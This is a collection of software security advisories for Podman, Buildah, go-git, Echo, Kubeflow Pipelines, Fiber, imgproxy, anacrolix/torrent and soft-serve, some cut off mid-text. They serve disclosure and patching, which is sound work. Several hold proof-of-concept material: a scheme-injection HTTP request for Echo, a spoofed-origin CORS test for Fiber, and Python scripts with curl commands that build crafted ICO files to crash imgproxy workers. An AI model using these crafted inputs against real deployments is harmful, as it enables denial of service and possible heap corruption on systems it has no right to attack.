advisories.name: Podman: The `podman run` command can be instructed to disable almost all sandboxing by image annotation
advisories.description:
### Impact
Podman v4.4.0 added a feature where container checkpoints (from the `podman container checkpoint` command) could be distributed via OCI registry, and pulled from that registry and run via the `podman run` command. This allowed easy transfer of checkpoints between systems. However, checkpoints allow complete control of how the container is created - including full control of the container sandbox. When `podman run` detects a checkpoint, it will silently ignore all user input regarding how the container should be created - for example, `podman run --cap-drop=ALL` on an image that is determined to be a checkpoint will ignore `--cap-drop=all` and use the set of capabilities specified by the checkpoint image instead, which could include all capabilities. Podman identifies checkpoint images by looking for an annotation, `io.podman.annotations.checkpoint.runtime.name`. If this annotation is set, the image is treated as a checkpoint. Conflating container images and checkpoints in `podman run` allows inherently insecure behavior as the image can now control how it is executed. The Podman Maintainers have determined that the safest course of action is to remove this functionality.

### Patch
The commit introducing this functionality was reverted.

3721ff82ffb44a4ceeaecc5abd3808e924a6b669 c74b1d37b3fb834b0de43e176565d9d8c254b627 fa6cef22c2baf3987b581c673bb416ef0585daf7 (main)
ea9243e04d1db3886dc3a51ee3300ffb547cfc02 450c64426dbcff1097d3c7911d791101e3d16f4c 2d05a7c61f022d4f24980ea6d307fa53da2b8692 (v6.1)
7728ba0a90094408ad9078e36c3622a651d49616 24706290d5c974f078d8ca284026802515f28e92 29c8c6e50607df7a7d735ace09ff0ea099c0b3e0 (v5.8)

### Workarounds
Images being pulled should be scanned for the `io.podman.annotations.checkpoint.runtime.name` annotation, and rejected if it is present. Podman does not presently have the ability to perform this scanning and rejection automatically.

Also not that rootless containers are not affected as they do not support checkpoint/restore at all currently.

### Credits
This vulnerability was discovered by ADA Logics Ltd using Anthropic's Claude models.

advisories.name: podman kube play symlink traversal vulnerability
advisories.description:
### Impact

The podman kube play command can overwrite host files when the kube file contains a ConfigMap or Secret volume mount and the volume already contains a symlink to a host file.
This allows a malicious container to write to arbitrary files on the host BUT the attacker only controls the target path not the contents that will be written to the file. The contents are defined in the yaml file by the end user.

### Requirements to exploit:
podman kube play must be used with a ConfigMap or Secret volume mount AND must be run more than once on the same volume. All the attacker has to do is create the malicious symlink on the volume the first time it is started. After that all following starts would follow the symlink and write to the host location. 


### Patches
Fixed in podman v5.6.1
https://github.com/containers/podman/commit/43fbde4e665fe6cee6921868f04b7ccd3de5ad89

### Workarounds

Don't use podman kube play with ConfigMap or Secret volume mounts.

### PR with test for CI

Adding on 9/8/2025 by @TomSweeneyRedHat , this is the PR containing the test in CI: https://github.com/containers/podman/pull/27001

advisories.name: go-git missing validation decoding Index v4 files leads to panic
advisories.description:
### Impact

`go-git`’s index decoder for format version 4 fails to validate the path name prefix length before applying it to the previously decoded path name. A maliciously crafted index file can trigger an out-of-bounds slice operation, resulting in a runtime panic during normal index parsing.

This issue only affects Git index format version 4. Earlier formats (`go-git` supports only `v2` and `v3`) are not vulnerable to this issue.

An attacker able to supply a crafted `.git/index` file can cause applications using go-git to panic while reading the index. If the application does not recover from panics, this results in process termination, leading to a denial-of-service (DoS) condition.

Exploitation requires the ability to modify or inject a Git index file within the local repository in disk. This typically implies write access to the `.git` directory.

### Patches

Users should upgrade to `v5.17.1`, or the latest `v6` [pseudo-version](https://go.dev/ref/mod#pseudo-versions), in order to mitigate this vulnerability.

### Credit

go-git maintainers thank @kq5y for finding and reporting this issue privately to the `go-git` project.

advisories.name: Echo has Arbitrary Scheme Injection in WWWRedirect/NonWWWRedirect Middlewares via X-Forwarded-Proto
advisories.description:
## Summary

The `c.Scheme()` method in Echo (`context.go:162-181`) trusts the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, and `X-Url-Scheme` request headers without validating that the value is `http` or `https`. The `WWWRedirect()` and `NonWWWRedirect()` middlewares use this unsanitized scheme to construct redirect URLs, allowing an attacker to inject arbitrary URI schemes into the `Location` response header.

## Affected Components

- `context.go:162-181` - `Scheme()` method returns attacker-controlled value verbatim
- `middleware/redirect.go:172-184` - `redirectWWW`/`redirectNonWWW` use unsanitized scheme

## Proof of Concept

```
GET /path HTTP/1.1
Host: example.com
X-Forwarded-Proto: javascript

Response:
HTTP/1.1 301 Moved Permanently
Location: javascript://www.example.com/path
```

Confirmed injectable schemes: `javascript`, `data`, `vbscript`, `file`, `ftp`, `ssh`, `telnet`, `gopher`.

Only `WWWRedirect()` and `NonWWWRedirect()` (and `WithConfig` variants) are affected. `HTTPSRedirect`, `HTTPSWWWRedirect`, `HTTPSNonWWWRedirect` are NOT affected (they hardcode `https://`).

## Impact

- Open redirect to arbitrary scheme URLs when app is not behind a proxy that strips `X-Forwarded-Proto`
- Cache poisoning when behind a CDN that caches redirect responses keyed by path
- `file://` scheme injection could trigger file access in some browser configurations

## Suggested Fix

Whitelist scheme in `c.Scheme()` to only return `http` or `https`:

```go
func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        scheme = strings.ToLower(strings.TrimSpace(scheme))
        if scheme == "https" {
            return "https"
        }
    }
    return "http"
}
```

## Disclosure

Source code review, manually verified with actual HTTP server. Tested on Echo v5.0.4 (latest master).

## Patches

Fixed in `github.com/labstack/echo/v5` v5.1.1 and `github.com/labstack/echo/v4` v4.15.2. `Context.Scheme()` now accepts only `http`, `https`, `ws` or `wss` from the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` headers, and falls back to `http` for any other value (#2953).

## Workarounds

Upgrade to a patched version. If you cannot upgrade, have your edge proxy overwrite or remove the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` request headers.

advisories.name: Kubeflow Pipelines: Pipeline archive upload allows decompression bomb to exhaust server memory
advisories.description:
## Summary

The Kubeflow Pipelines API server decompresses uploaded pipeline archives without adequately bounding expanded data in affected versions. A small ZIP or gzip-compressed tar archive can consume disproportionately large amounts of memory while the server locates or reads the pipeline file, potentially exhausting API-server resources and interrupting service.

Multipart pipeline and pipeline-version upload processing decompresses the archive before namespace authorization, so a caller who can reach those endpoints does not need a successful pipeline-create authorization decision to trigger the issue. External authentication and network controls can restrict reachability. URL-import handlers authorize before fetching and decompressing a remote archive.

The amount of expansion needed to exhaust memory depends on deployment resource limits and concurrent activity; no particular archive is guaranteed to crash every deployment.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #14171](https://github.com/kubeflow/pipelines/pull/14171) bounds compressed input and extracted pipeline data. [PR #14186](https://github.com/kubeflow/pipelines/pull/14186) strengthens the total tar traversal budget, including metadata and skipped entries. The 2.18 release also includes configurable upload and specification limits; operators should review the shipped settings and resource budget. These controls address pipeline archive amplification and do not establish general HTTP-body, temporary-disk, concurrency, or CPU limits.

Until upgrading, restrict access to upload and import endpoints and apply deployment-level request and resource controls. A compressed upload-size limit alone does not prevent decompression amplification. Regression tests cover compressed input, selected-entry boundaries, and tar traversal budgets; no deployed-server OOM test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Ayush Gupta ([@Ayush-kathil](https://github.com/Ayush-kathil)) authored the archive fixes in #14171 and #14186, with Jeff Spahr ([@jeffspahr](https://github.com/jeffspahr)) contributing regression coverage to #14171.

[@BrianWillows](https://github.com/BrianWillows) later submitted a mixed report that included source analysis of pipeline-archive decompression.

advisories.name: Kubeflow Pipelines: Run-log endpoint permits unauthorized access to pod logs
advisories.description:
## Summary

The Kubeflow Pipelines API server's `GET /apis/v1alpha1/runs/{run_id}/nodes/{node_id}/log` handler retrieves logs without authorizing the caller against the selected run. A caller who can reach the backend and knows a victim run ID and a suitable pod or node identifier can read live or archived logs using the API server's permissions.

For live logs, the vulnerable handler also accepts the supplied node ID as a pod name in the run's namespace without verifying that the pod belongs to the run. Depending on the API server's pod-log permissions, a known run ID can therefore permit reading the `main` container logs of an unrelated pod in that namespace. Logs may contain sensitive workload data or credentials.

The affected handler does not authenticate the request itself. An external authentication gate or network policy can restrict reachability; public ingress exposure and unauthenticated enumeration of run IDs are not assumed.

## Remediation

Upgrade the API server to **[Kubeflow Pipelines 2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Versions through 2.17.3 are affected; the first affected release has not been established.

[PR #13684](https://github.com/kubeflow/pipelines/pull/13684) authorizes the caller with the `readLog` verb before retrieving live or archived logs. For live logs, it also verifies that the pod's `pipeline/runid` label matches the requested run. Custom Kubernetes roles must grant `readLog` on `runs` in the `pipelines.kubeflow.org` API group; the bundled viewer and editor roles include it. Shared read access alone does not grant log access.

Until upgrading, restrict access to the backend log endpoint. Focused regression tests cover authorization denial, HTTP identity propagation, pod/run mismatch, archive retrieval, and cancellation; no new deployed-cluster end-to-end test was performed for this assessment.

## Credit

[bugbunny.ai](https://bugbunny.ai) discovered and reported the issue. Nayyar ([@naruto-lgtm](https://github.com/naruto-lgtm)) authored the fix in #13684.

[@patchmyday](https://github.com/patchmyday), [@thesecguy45](https://github.com/thesecguy45), [@VitoCrl](https://github.com/VitoCrl), [@Grg0rry](https://github.com/Grg0rry), [@arpitjain099](https://github.com/arpitjain099), and [@BrianWillows](https://github.com/BrianWillows) made later submissions concerning the run-log authorization gap. **MUTEDCYBERSECURITY S.L.** separately reported a synthetic two-tenant reproduction, including the unrelated-pod log path.

advisories.name: Fiber: CORS wildcard origins matched without a dot boundary, allowing credentialed cross-origin reads
advisories.description:
### Summary

In v2.52.1 and v2.52.2 the CORS middleware matched a wildcard origin such as `https://*.example.com` by suffix only, without a dot boundary and without comparing the scheme. Any origin whose host ends with the base domain, for example `https://evil-example.com` or `http://notexample.com`, was reflected in `Access-Control-Allow-Origin`, together with `Access-Control-Allow-Credentials: true` when `AllowCredentials` is enabled.

v2.52.3 replaced the matcher (#2915) and is not affected. The report was filed against v2.52.15, where the dot boundary holds; see "Other versions" below.

### Details

v2.52.1 introduced `validateDomain` in `middleware/cors/utils.go` (f0cd3b44, part of the fix for GHSA-fmg4-x8pw-hjhg). It strips scheme and port from both sides and then checks only the suffix, with `trimmedPattern = "example.com"`, so the character before the suffix is never checked:

```go
if strings.HasPrefix(normalizedPattern, "*.") {
	trimmedPattern := normalizedPattern[2:]
	if strings.HasSuffix(normalizedDomain, trimmedPattern) {
		if normalizedDomain != trimmedPattern {
			if strings.TrimSuffix(normalizedDomain, trimmedPattern) != "" {
				return true
			}
		}
	}
}
```

v2.52.3 (1aac6f61, #2915) replaced it with a scheme-aware prefix/suffix split that keeps the leading dot in the suffix (`.example.com`).

### Proof of concept

```go
app := fiber.New()
app.Use(cors.New(cors.Config{
	AllowOrigins:     "https://*.example.com",
	AllowCredentials: true,
}))
app.Get("/", func(c *fiber.Ctx) error { return c.SendString("secret") })
```

Request with `Origin: https://evil-example.com`, as a GET and as a preflight (`OPTIONS` with `Access-Control-Request-Method: GET`):

| Version | `https://evil-example.com` | `http://evil-example.com` |
|---|---|---|
| v2.52.0 | not allowed | not allowed |
| v2.52.1, v2.52.2 | reflected, `Access-Control-Allow-Credentials: true` | reflected, `Access-Control-Allow-Credentials: true` |
| v2.52.3 to v2.52.16 | not allowed | not allowed |

### Impact

An app that configures a wildcard-subdomain `AllowOrigins` with `AllowCredentials: true` lets any page on a domain that ends with the base domain (for example `notexample.com` for `*.example.com`) read authenticated responses cross-origin. Fixed in v2.52.3; upgrade to the latest v2 release.

### Other versions

All v2 releases before v2.52.16 also accepted origins with empty labels (`https://.example.com`, `https://a..example.com`), and v2.52.3 to v2.52.15 mis-parsed a wildcard entry after a comma and a space (`"https://a.com, https://*.example.com"`). No registrable domain produces such an origin, so these are hardening rather than part of this advisory. They are fixed in v2.52.16 (#4792).

advisories.name: imgproxy has integer overflow in imgproxy ICO loader that causes denial of service and may permit remote code execution
advisories.description:
## Summary

The ICO loader allocates `data_size + BMP_FILE_HEADER_LEN` bytes after reading a 32-bit attacker-controlled `data_size`. For `data_size > UINT32_MAX - BMP_FILE_HEADER_LEN`, the addition wraps before allocation. imgproxy then writes the ICO prefix and reads up to the original declared size starting 14 bytes into the undersized allocation. A network client can turn this heap overflow into remote denial of service or remote code execution.

## Technical details

The vulnerable path is in [`vips/icoload.c` at commit `f4fedbb`](https://github.com/imgproxy/imgproxy/blob/f4fedbb5c7f6684e7a8e0a9bb7e666773f3c40c0/vips/icoload.c#L154-L164):

```c
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
void *actual_data = data + BMP_FILE_HEADER_LEN;

if (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {
  vips_error("vips_foreign_load_ico_header", "unable to read ICO image data from the source");
  return -1;
}
```

The crafted directory entry contains:

```text
data_size       = 0xfffffff5 (4294967285)
data_offset     = 22
BMP header size = 14
32-bit result   = (0xfffffff5 + 14) mod 2^32 = 3
```

The allocation is therefore three bytes. `actual_data` points 14 bytes after the allocation base. The fixture contains 64 bytes after the ICO header, so the source callback copies those 64 bytes to an invalid destination before it can report that the declared multi-gigabyte payload is incomplete.

The complete source-to-sink path is:

1. Attacker-controlled bytes begin with the ICO magic `00 00 01 00`.
2. imgproxy identifies the source as ICO and dispatches it to `vips_icoload_source_go`.
3. `vips_foreign_load_ico_header` reads the attacker-controlled `data_size`.
4. The 32-bit addition wraps, and `VIPS_MALLOC` receives the value three.
5. `vips_foreign_load_read_full` passes the original `data_size` to the Go source callback.
6. The callback writes the available source bytes through the invalid pointer, corrupting the process heap.

## Impact

A crafted image can terminate the imgproxy process handling it or potentially lead to remote code execution due to heap corruption.

advisories.name: imgproxy has out-of-bounds heap read/write in ICO loader BMP header reconstruction that allows unauthenticated remote worker crash
advisories.description:
### Summary

Out-of-bounds heap write in imgproxy's ICO loader (`vips/icoload.c`): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc `munmap_chunk(): invalid pointer` → SIGABRT → Go panic, exit code 2). 

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, after the ICO entry's image data is read into a heap buffer of `data_size + 14` bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:

```
uint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated
uint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated
```

```
if ((num_colors == 0) && (bpp <= 8))
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);
else
  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;
```

```
int32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer
height = height / 2;
```

With a crafted entry declaring a tiny `data_size` (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit `height/2`-derived value at `alloc+22..+25`, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always `original_size >> 1` and, in cgo thread arenas, the `NON_MAIN_ARENA` bit lands in the `IS_MMAPPED` position of the corrupted word such that the next `free()` of the victim deterministically takes glibc's `munmap_chunk()` abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).


### PoC

```py
# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.
# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads
# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte
# allocation.
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)
data = b'\xAA'  # the single declared image byte
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'
open('ico-oob.ico', 'wb').write(blob)
print(f"ico-oob.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-oob.ico@png"
# → request fails at transport level (connection reset / empty reply) or
#   HTTP 500; worker dies: munmap_chunk(): invalid pointer → SIGABRT →
#   Go panic dump → exit code 2. One request, one dead worker.

curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/normal.ico@png"
# → HTTP 200, valid thumbnail (control)
```

### Impact

Out-of-bounds write; demonstrated impact is denial of service (worker crash per crafted request). Any imgproxy deployment from the 3.3.x ICO-support series through v4.0.15 (latest at time of report) that processes attacker-supplied images.

advisories.name: imgproxy has unbounded memory allocation in ICO loader that allows unauthenticated memory-exhaustion DoS via crafted data_size field
advisories.description:
### Summary

Unbounded and unvalidated memory allocation in imgproxy's ICO loader (`vips/icoload.c`). An attacker-controlled `data_size` field (u32) from the ICO directory entry is passed directly to `VIPS_MALLOC` without any bounds check, so a single crafted 23-byte ICO file makes an imgproxy worker attempt a ~4GB allocation. Present in the latest release (v4.0.15) and the 3.3.x series; confirmed on a live production deployment of imgproxy v4.0.15.

### Details

In `vips_foreign_load_ico_header` in `vips/icoload.c`, the selected directory entry's `data_size` is read and used directly for the allocation:

```
uint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);

// BMP file explicitly excludes BITMAPFILEHEADER, so we need to add it manually.
VipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);
```

There is no validation that `data_size` is sane nor any check that the file actually contains `data_size` bytes at the declared `data_offset`. A crafted 23-byte ICO whose directory entry declares `data_size = 0xfa000068` (~4GB) drives `VIPS_MALLOC(NULL, ~4GB + 14)`.

### PoC

```py
# make_ico_4gb.py — generates the exact 23-byte unbounded-allocation trigger.
# Byte-identical to the checksummed, production-verified file:
#   ico-4gb.ico  sha256 6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b
import struct, hashlib

hdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1
entry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 0xfa000068, 0x16)
data = b'\x00'
blob = hdr + entry + data
assert hashlib.sha256(blob).hexdigest() == \
    '6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b'
open('ico-4gb.ico', 'wb').write(blob)
print(f"ico-4gb.ico: {len(blob)} bytes [VERIFIED]")
```

```
# imgproxy v4.0.15 with local file sources enabled:
#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy
curl "http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-4gb.ico@png"
# → outcome depends on host memory: on a memory-constrained pod the worker
#   OOM-dies; on a larger host the ~4GB allocation succeeds transiently and
#   decode fails -> HTTP 500 (worker survives, but each request burns ~4GB
#   transiently — repeatable memory exhaustion).
```

### Impact

Unauthenticated network DoS / memory-exhaustion: on memory-constrained workers, a crash per crafted request. On larger hosts, ~4GB transient allocation per request (sustained firing exhausts memory or the allocation budget). Any imgproxy deployment that processes attacker-supplied images.

advisories.name: anacrolix torrent has unbounded recursion in the bencode decoder that causes stack-overflow crash and CPU-exhaustion DoS
advisories.description:
## Summary

anacrolix/torrent's bencode decoder (`bencode/`) applies **no limit on the nesting depth** of nested dictionaries and lists. Two distinct denial-of-service mechanisms follow from that single root cause, both reachable from a single crafted `.torrent` file or from metadata obtained from a peer on a magnet-link/v2 download:

1. **Stack-overflow process crash.** `Decoder.readOneValue` recurses once per nesting level with no depth bound. A `.torrent` whose `info` value is a list nested a few million levels deep (≈8 MB file) drives the recursion past the 1 GiB goroutine-stack limit and the process dies with an unrecoverable `fatal error: stack overflow`. 2. **Quadratic CPU exhaustion.** `metainfo.FileTree.UnmarshalBencode` (BitTorrent v2) re-parses each subtree at every level, making parse time grow ~O(n²). A v2 info dict with a ~30,000-level file tree (≈0.2 MB) takes ~66 s to decode; 60,000 levels exceeds 90 s of decode time.

Affected: every application embedding `github.com/anacrolix/torrent` that ingests attacker-supplied metainfo - the CLI tools (`cmd/torrent`, `cmd/torrent2`), any server that opens `.torrent` files, or any client that accepts metadata from a peer for a magnet/v2 download. No depth limit has ever existed in the decoder.

## Vulnerability Details

All file:line references are against the pinned commit `4ad31c5170787215c51c6ddaa54abc06b623c11c`.

### Root cause - no recursion/depth limit in the bencode decoder

`bencode/decode.go` implements three independently unbounded recursive parsers. There is no depth counter and no `MaxDepth`/nesting guard anywhere in `bencode/` or `metainfo/`.

**Defect 1 - `readOneValue` recursion (`bencode/decode.go:546-549`)**

```go
case 'd', 'l':
    // read until there is nothing to read
    for d.readOneValue() {
    }                       // <- recurses once per nested dict/list level, unbounded
```

`readOneValue` is invoked by `Decoder.parseUnmarshaler` (`bencode/decode.go:591`) whenever a decoded field implements `bencode.Unmarshaler`, which includes `bencode.Bytes` - the type of `MetaInfo.InfoBytes` (`metainfo/metainfo.go:17`). So decoding a normal `.torrent` routes the entire `info` value through this recursion. Stack usage is ~256 bytes per level (consistent with the observed ~4M-level crash at the 1 GiB goroutine-stack limit), so nesting `l` a few million levels deep exhausts the 1 GiB default goroutine-stack limit. Go's stack overflow is a `fatal error` - it is not a recoverable panic, so the `recover()` in `Decoder.Decode` (`bencode/decode.go:35-55`) cannot intercept it, and the whole process terminates.

Entry points that reach `readOneValue` with attacker-controlled bytes:
- `metainfo.Load` (`metainfo/metainfo.go:35`) / `metainfo.LoadFromFile` (`metainfo.go:50`) - decoding a `.torrent` file; the `info` value becomes a `bencode.Bytes` unmarshaler field.
- `Client.AddTorrent` / `Client.AddTorrentFromFile` -> `metainfo.LoadFromFile` (`client.go:1776` inside `AddTorrentFromFile`), and `TorrentSpec.InfoBytes` -> `setInfoBytesLocked` -> `bencode.Unmarshal(b, &info)` (`torrent.go:638`) - peer-fetched metadata.

For the **remote-peer path** (magnet-link/v2 download), peer-supplied metadata pieces are reassembled and passed to `setInfoBytesLocked` once complete (`torrent.go:1874`). The accepted metadata size is capped at `maxMetadataSize = 16 MiB` (`global.go:18`), which comfortably admits the ≈8 MB Defect-1 payload and the ≈0.2 MB Defect-2 payload, so both defects are reachable from an untrusted peer, not only from a locally-opened `.torrent`.

**Defect 2 - `FileTree.UnmarshalBencode` recursive re-parse (`metainfo/file-tree.go:42-49`)**

```go
for key, bytes := range dir {
    var sub FileTree
    err = sub.UnmarshalBencode(bytes)   // <- recurses once per file-tree level, and each call re-runs
                                        //   bencode.Unmarshal over its entire subtree
```

`FileTree` implements `bencode.Unmarshaler` (`file-tree.go:53`), so the `file tree` field of a v2 info dict (`metainfo/info.go:33`) routes through it. Each level calls `sub.UnmarshalBencode`, which starts with `bencode.Unmarshal(bytes, &dir)` over the *whole remaining subtree*. A file tree nested `D` levels deep therefore performs O(D) `bencode.Unmarshal` calls, each over an O(D)-sized payload - O(D²) total parse work. The steady state is a CPU-bound single goroutine, so the embedding process simply hangs.

Reachability: any `bencode.Unmarshal` into `metainfo.Info`, including the peer-metadata path `setInfoBytesLocked` (`torrent.go:638`) for a magnet/v2 download, and `MetaInfo.UnmarshalInfo` (`metainfo/metainfo.go:61-64`).

### Sanitizers / existing limits that do NOT apply

- `Decoder.MaxStrLen` (`bencode/decode.go:787-791`, default 128 MiB) bounds a *single string value*; it is never consulted by `readOneValue` (`decode.go:564` does `io.CopyN(&d.buf, d.r, length)` with no `MaxStrLen` check) and does not bound dict/list nesting depth.
- The existing fuzzers (`ben

advisories.name: Buildah allows arbitrary directory mount
advisories.description: A vulnerability was found in Buildah. Cache mounts do not properly validate that user-specified paths for the cache are within our cache directory, allowing a `RUN` instruction in a Container file to mount an arbitrary directory from the host (read/write) into the container as long as those files can be accessed by the user running Buildah.

advisories.name: charmbracelet/soft-serve: Race in `SetPrivate` leaves a private repository readable by unauthenticated users
advisories.description:
## Summary

Soft Serve cached repository records in memory with no expiry, and trusted the cached record for every access check. `SetPrivate` cleared the cached record before it saved the new visibility, and not afterwards.

A request that arrived between the two read the old, public record from the database and cached it after the change was saved. From then on every access check used that stale record, so a repository the operator had just made private stayed readable by unauthenticated users over HTTP, SSH, and `git://` until the server restarted.

## Impact

An unauthenticated attacker can keep reading a repository after it is made private, including everything pushed to it afterwards. The attacker needs no account and no timing knowledge: a client polling `GET /<repo>.git/info/refs?service=git-upload-pack`, which the default `anon-access: read-only` allows, will eventually land in the window when the operator changes the visibility.

The stale record lasts until the server restarts or the entry is evicted, and the operator gets no sign of it. `repo private <name>` reads the database directly and reports `true`, and the `visibility_change` webhook is not sent, because its check reads the same stale record.

Write access is not gained. Because the repository was public until the change, an attacker able to win the race could already read its contents up to that point. What this adds is continued access to everything pushed after the operator made it private.

Deployments that run several Soft Serve processes against one shared database were affected more broadly. Each process kept its own cache, so a visibility change made through one process never reached the others, with no race required.

Reachable over HTTP, SSH, and `git://` (AV:N). Success depends on a visibility change made by the operator, which the attacker does not control (AC:H). No privileges are required under the default anonymous read access (PR:N), and the attacker interacts with no one, since the operator's change is already captured by AC:H (UI:N). Continued read access to a repository its owner has made private is a high confidentiality impact (C:H), with no integrity or availability impact (I:N, A:N).

## Root Cause

The cache was the source of truth for access checks, and clearing it was treated as a step before the write rather than after it.

`Backend.Repository` in `pkg/backend/repo.go` returned the cached record when present, and on a miss read the database and stored the result. The cache was a plain LRU of 1000 entries with no expiry (`pkg/backend/cache.go`), and `AccessLevelForUser` read the private flag from that record.

`SetPrivate` ran in this order:

```go
d.cache.Delete(name)
... d.db.TransactionContext(ctx, func(tx *db.Tx) error {
	... writes or removes git-daemon-export-ok ...
	return d.store.SetRepoIsPrivateByName(ctx, tx, name, private)
})
```

A reader that missed the cache after the `Delete` but read the database before the commit got the old row, and stored it after the commit. Nothing ever cleared it again.

`SetHidden`, `SetMirror`, `SetDescription`, and `SetProjectName` cleared the cache in the same place. `DeleteRepository` and `RenameRepository` deferred the clear inside the transaction function, which also runs before the commit.

Moving the clear to after the commit would not have been enough on its own. A reader that read the old row before the commit could still store it after the clear.

## Affected Versions

v0.6.0 through v0.12.2. The repository cache and this ordering arrived with the database-backed backend in commit `e398b4d` (`refactor: implement database module and abstract backend`, #337), first released in v0.6.0. Versions v0.5.x used a different backend and were not assessed.

## Patches

Fixed in `v0.12.3`.

The repository cache is removed. Every lookup now reads the database, so an access check always sees the visibility most recently saved, whether by this process or any other sharing the database.

Removing the cache was preferred over making it race-free. A database lookup costs tens of microseconds on SQLite, which is small next to the Git work behind each request, while keeping the cache correct needed a versioning scheme around every write and still left multi-process deployments stale. Without the cache, the whole class of stale-authorization bugs goes away rather than this one instance.

The `visibility_change` webhook is also fixed in the same release. It now compares against the visibility saved before the change, so it fires when visibility actually changes and only then.

## Workarounds

It is recommended to upgrade to the patched release.

No configuration closes the race. Restarting the server clears a stale record and restores correct access checks until the next visibility change. Operators who cannot upgrade immediately should create repositories as private from the start (`repo create -p`) rather than making public ones private, and avoid changing visibility while the server

advisories.name: charmbracelet/soft-serve HTTP responses disclose the existence and names of private repositories
advisories.description:
## Summary

Soft Serve answers Go's `?go-get=1` requests by walking up the requested path until it finds a repository, then rendering that repository's name and clone URL into a `go-import` meta tag. The walk checked that each candidate repository existed, but never that the caller could read it.

A request for a path inside a private repository, such as `GET /secret/anything?go-get=1`, therefore returned `200` naming `secret` and its clone URL, even though `GET /secret?go-get=1` correctly returned `404`. The same `?go-get=1` exception in the HTTP access middleware also let requests reach the LFS and dumb-HTTP routes with the repository existence check skipped, where two LFS handlers dereferenced the missing repository and panicked.

The same disclosure appears without `?go-get=1`. The Git and LFS routes answered a repository the caller could not read differently depending on whether it existed: an anonymous clone of a private repository got `401` while a missing one got `404`, and a signed-in user without access got the reverse pattern. Either way, one request confirms whether a guessed name is a private repository. This was found while fixing the go-get issue and is included here because it has the same impact and is fixed in the same release.

## Impact

A remote client can learn, with one request per candidate name, which private repositories exist, their exact names, and their clone URLs. Under the shipped default of `anon-access: read-only` no account is needed, and an authenticated user without access to the repository gets the same answer. Project names in private deployments are often sensitive (internal codenames, unreleased products, customer names), and this turns them into an enumerable namespace.

The Git and LFS routes give the same confirmation for any guessed name, to anonymous and authenticated callers alike, and an invalid `Authorization: Bearer` header does the same even where credentials are otherwise required.

Repository contents, refs, commits, and collaborators are not exposed, and no write path is reachable. The LFS panic is caught by the recovery middleware and returns a `500`; the server stays up. Hidden repositories are not affected beyond what direct access already allows, since hiding a repository removes it from listings but does not restrict reading it by name.

Reachable over the HTTP interface, which is enabled by default (AV:N), with one ordinary GET request per name (AC:L). No privileges are required under the default anonymous read access (PR:N), and no victim interaction is needed (UI:N). Only repository names and clone URLs are disclosed, which is a low confidentiality impact (C:L), with no integrity or availability impact (I:N, A:N), since the panic is recovered per request.

## Root Cause

Two pieces of code each assumed the other had checked access.

`withAccess` in `pkg/web/git.go` computed the access level for the requested path and then let go-get requests through ahead of the guard meant to hide repositories:

```go
case r.URL.Query().Get("go-get") == "1" && accessLevel >= access.ReadOnlyAccess:
	// Allow go-get requests to passthrough.
	break
case repo == nil, accessLevel < access.ReadOnlyAccess:
	// Don't hint that the repo exists if the user doesn't have access
	renderNotFound(w, r)
	return
```

